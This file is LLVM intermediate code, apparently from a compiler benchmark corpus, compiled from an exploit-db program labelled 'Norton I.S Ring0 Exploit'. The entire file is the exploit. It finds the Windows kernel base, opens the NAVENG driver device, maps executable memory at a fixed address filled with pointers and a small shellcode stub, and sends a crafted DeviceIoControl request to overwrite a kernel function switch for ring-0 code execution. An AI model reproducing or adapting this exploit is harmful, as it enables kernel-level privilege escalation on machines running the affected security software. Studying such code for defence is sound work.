; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_28763.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_28763.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_PATH = common dso_local global i32 0, align 4
@__const.main.Ring0ShellCode = private unnamed_addr constant [5 x i8] c"\CC\90\90\90\00", align 1
@.str = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"\0A################################\0A\00", align 1
@.str.2 = private unnamed_addr constant [34 x i8] c"## Norton I.S                 ##\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"## Ring0 Exploit              ##\0A\00", align 1
@.str.4 = private unnamed_addr constant [34 x i8] c"################################\0A\00", align 1
@.str.5 = private unnamed_addr constant [40 x i8] c"\0ARuben Santamarta\0Awww.reversemode.com\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [34 x i8] c"\0Ausage> exploit.exe <XP> or <2K>\0A\00", align 1
@.str.7 = private unnamed_addr constant [10 x i8] c"psapi.dll\00", align 1
@.str.8 = private unnamed_addr constant [18 x i8] c"EnumDeviceDrivers\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c"GetDeviceDriverBaseNameA\00", align 1
@.str.10 = private unnamed_addr constant [44 x i8] c"\0A[!] Searching Ntoskrnl.exe Base Address...\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"ntoskr\00", align 1
@.str.12 = private unnamed_addr constant [13 x i8] c"[%x] Found!\0A\00", align 1
@.str.13 = private unnamed_addr constant [50 x i8] c"!!? ntoskrnl.exe base address not found\0Aexiting\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"\\\\.\\NAVENG\00", align 1
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.15 = private unnamed_addr constant [29 x i8] c"\0A\0A** Initializing Exploit]\0A\0A\00", align 1
@.str.16 = private unnamed_addr constant [14 x i8] c"INFORMATION \0A\00", align 1
@.str.17 = private unnamed_addr constant [55 x i8] c"-----------------------------------------------------\0A\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"[!] NAVENG Device Handle [%x]\0A\00", align 1
@.str.19 = private unnamed_addr constant [3 x i8] c"XP\00", align 1
@WXP_SWITCH = common dso_local global i32 0, align 4
@W2K_SWITCH = common dso_local global i32 0, align 4
@.str.20 = private unnamed_addr constant [59 x i8] c"[!] Overwriting NtQuerySystemInformation Switch at [0x%x]\0A\00", align 1
@MEM_COMMIT = common dso_local global i32 0, align 4
@MEM_RESERVE = common dso_local global i32 0, align 4
@PAGE_EXECUTE_READWRITE = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [53 x i8] c"\0A\0A\09\09[!] Initializing Countdown,last chance to abort.\00", align 1
@.str.22 = private unnamed_addr constant [12 x i8] c"\0D -[ %d ]- \00", align 1
@.str.23 = private unnamed_addr constant [26 x i8] c"\0A\0A[*] Executing ShellCode\00", align 1
@.str.24 = private unnamed_addr constant [4 x i8] c"dir\00", align 1
@.str.25 = private unnamed_addr constant [27 x i8] c"\0A\0A[*] Exploit terminated\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca i32 (i32*, i32, i32*)*, align 8
  %19 = alloca i32 (i32, i8*, i32)*, align 8
  %20 = alloca [200 x i32], align 16
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i64, align 8
  %27 = alloca [5 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %22, align 4
  %28 = load i32, i32* @MAX_PATH, align 4
  %29 = zext i32 %28 to i64
  %30 = call i8* @llvm.stacksave()
  store i8* %30, i8** %25, align 8
  %31 = alloca i8, i64 %29, align 16
  store i64 %29, i64* %26, align 8
  %32 = bitcast [5 x i8]* %27 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.Ring0ShellCode, i32 0, i32 0), i64 5, i1 false)
  %33 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.5, i64 0, i64 0))
  %39 = load i32, i32* %4, align 4
  %40 = icmp slt i32 %39, 2
  br i1 %40, label %41, label %44

41:                                               ; preds = %2
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  %43 = call i32 @exit(i32 1) #5
  unreachable

44:                                               ; preds = %2
  %45 = call i32 @LoadLibrary(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %46 = call i64 @GetProcAddress(i32 %45, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0))
  %47 = inttoptr i64 %46 to i32 (i32*, i32, i32*)*
  store i32 (i32*, i32, i32*)* %47, i32 (i32*, i32, i32*)** %18, align 8
  %48 = call i32 @LoadLibrary(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %49 = call i64 @GetProcAddress(i32 %48, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %50 = inttoptr i64 %49 to i32 (i32, i8*, i32)*
  store i32 (i32, i8*, i32)* %50, i32 (i32, i8*, i32)** %19, align 8
  %51 = load i32 (i32*, i32, i32*)*, i32 (i32*, i32, i32*)** %18, align 8
  %52 = getelementptr inbounds [200 x i32], [200 x i32]* %20, i64 0, i64 0
  %53 = call i32 %51(i32* %52, i32 800, i32* %13)
  %54 = load i32, i32* %13, align 4
  %55 = sext i32 %54 to i64
  %56 = udiv i64 %55, 4
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %14, align 4
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.10, i64 0, i64 0))
  store i32 0, i32* %15, align 4
  br label %59

59:                                               ; preds = %85, %44
  %60 = load i32, i32* %15, align 4
  %61 = load i32, i32* %14, align 4
  %62 = icmp sle i32 %60, %61
  br i1 %62, label %63, label %88

63:                                               ; preds = %59
  %64 = load i32 (i32, i8*, i32)*, i32 (i32, i8*, i32)** %19, align 8
  %65 = load i32, i32* %15, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [200 x i32], [200 x i32]* %20, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = load i32, i32* @MAX_PATH, align 4
  %70 = call i32 %64(i32 %68, i8* %31, i32 %69)
  %71 = call i64 @strncmp(i8* %31, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0), i32 6)
  %72 = icmp eq i64 %71, 0
  br i1 %72, label %73, label %84

73:                                               ; preds = %63
  %74 = load i32, i32* %15, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [200 x i32], [200 x i32]* %20, i64 0, i64 %75
  %77 = load i32, i32* %76, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.12, i64 0, i64 0), i32 %77)
  %79 = load i32, i32* %15, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [200 x i32], [200 x i32]* %20, i64 0, i64 %80
  %82 = load i32, i32* %81, align 4
  store i32 %82, i32* %22, align 4
  %83 = load i32, i32* %22, align 4
  store i32 %83, i32* %23, align 4
  br label %84

84:                                               ; preds = %73, %63
  br label %85

85:                                               ; preds = %84
  %86 = load i32, i32* %15, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %15, align 4
  br label %59

88:                                               ; preds = %59
  %89 = load i32, i32* %22, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %94, label %91

91:                                               ; preds = %88
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.13, i64 0, i64 0))
  %93 = call i32 @exit(i32 0) #5
  unreachable

94:                                               ; preds = %88
  %95 = call i64 @CreateFile(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i64 0, i64 0), i32 0, i32 0, i32* null, i32 3, i32 0, i32 0)
  store i64 %95, i64* %17, align 8
  %96 = load i64, i64* %17, align 8
  %97 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %98 = icmp eq i64 %96, %97
  br i1 %98, label %99, label %101

99:                                               ; preds = %94
  %100 = call i32 (...) @ShowError()
  br label %101

101:                                              ; preds = %99, %94
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.15, i64 0, i64 0))
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.16, i64 0, i64 0))
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.17, i64 0, i64 0))
  %105 = load i64, i64* %17, align 8
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i64 0, i64 0), i64 %105)
  store i32 4, i32* %10, align 4
  store i32 2239187, i32* %9, align 4
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  %109 = load i8*, i8** %108, align 8
  %110 = call i64 @strncmp(i8* %109, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i64 0, i64 0), i32 2)
  %111 = icmp eq i64 %110, 0
  br i1 %111, label %112, label %116

112:                                              ; preds = %101
  %113 = load i32, i32* %22, align 4
  %114 = load i32, i32* @WXP_SWITCH, align 4
  %115 = add nsw i32 %113, %114
  store i32 %115, i32* %16, align 4
  br label %120

116:                                              ; preds = %101
  %117 = load i32, i32* %22, align 4
  %118 = load i32, i32* @W2K_SWITCH, align 4
  %119 = add nsw i32 %117, %118
  store i32 %119, i32* %16, align 4
  br label %120

120:                                              ; preds = %116, %112
  %121 = load i32, i32* %16, align 4
  %122 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.20, i64 0, i64 0), i32 %121)
  %123 = load i32, i32* @MEM_COMMIT, align 4
  %124 = load i32, i32* @MEM_RESERVE, align 4
  %125 = or i32 %123, %124
  %126 = load i32, i32* @PAGE_EXECUTE_READWRITE, align 4
  %127 = call i64 @VirtualAlloc(i32 33554432, i32 61440, i32 %125, i32 %126)
  %128 = inttoptr i64 %127 to i32*
  store i32* %128, i32** %8, align 8
  store i32 1, i32* %15, align 4
  br label %129

129:                                              ; preds = %139, %120
  %130 = load i32, i32* %15, align 4
  %131 = icmp slt i32 %130, 15360
  br i1 %131, label %132, label %142

132:                                              ; preds = %129
  %133 = load i32*, i32** %8, align 8
  %134 = ptrtoint i32* %133 to i32
  %135 = load i32*, i32** %8, align 8
  %136 = load i32, i32* %15, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i32, i32* %135, i64 %137
  store i32 %134, i32* %138, align 4
  br label %139

139:                                              ; preds = %132
  %140 = load i32, i32* %15, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %15, align 4
  br label %129

142:                                              ; preds = %129
  %143 = load i32*, i32** %8, align 8
  %144 = ptrtoint i32* %143 to i32
  %145 = getelementptr inbounds [5 x i8], [5 x i8]* %27, i64 0, i64 0
  %146 = ptrtoint i8* %145 to i32
  %147 = call i32 @memcpy(i32 %144, i32 %146, i32 5)
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.21, i64 0, i64 0))
  store i32 10, i32* %15, align 4
  br label %149

149:                                              ; preds = %161, %142
  %150 = load i32, i32* %15, align 4
  %151 = icmp sge i32 %150, 1
  br i1 %151, label %152, label %164

152:                                              ; preds = %149
  %153 = load i32, i32* %15, align 4
  %154 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.22, i64 0, i64 0), i32 %153)
  %155 = load i32, i32* %15, align 4
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %159

157:                                              ; preds = %152
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.23, i64 0, i64 0))
  br label %159

159:                                              ; preds = %157, %152
  %160 = call i32 @Sleep(i32 1000)
  br label %161

161:                                              ; preds = %159
  %162 = load i32, i32* %15, align 4
  %163 = add nsw i32 %162, -1
  store i32 %163, i32* %15, align 4
  br label %149

164:                                              ; preds = %149
  %165 = load i64, i64* %17, align 8
  %166 = load i32, i32* %9, align 4
  %167 = load i32, i32* %16, align 4
  %168 = load i32, i32* %10, align 4
  %169 = call i32 @DeviceIoControl(i64 %165, i32 %166, i32 0, i32 0, i32 %167, i32 %168, i32* %12, i32* null)
  %170 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0))
  %171 = load i64, i64* %17, align 8
  %172 = call i32 @CloseHandle(i64 %171)
  %173 = load i32*, i32** %8, align 8
  %174 = call i32 @free(i32* %173)
  %175 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.25, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %176 = load i8*, i8** %25, align 8
  call void @llvm.stackrestore(i8* %176)
  %177 = load i32, i32* %3, align 4
  ret i32 %177
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @system(i8*) #3

declare dso_local i32 @printf(i8*, ...) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @GetProcAddress(i32, i8*) #3

declare dso_local i32 @LoadLibrary(i8*) #3

declare dso_local i64 @strncmp(i8*, i8*, i32) #3

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32) #3

declare dso_local i32 @ShowError(...) #3

declare dso_local i64 @VirtualAlloc(i32, i32, i32, i32) #3

declare dso_local i32 @memcpy(i32, i32, i32) #3

declare dso_local i32 @Sleep(i32) #3

declare dso_local i32 @DeviceIoControl(i64, i32, i32, i32, i32, i32, i32*, i32*) #3

declare dso_local i32 @CloseHandle(i64) #3

declare dso_local i32 @free(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
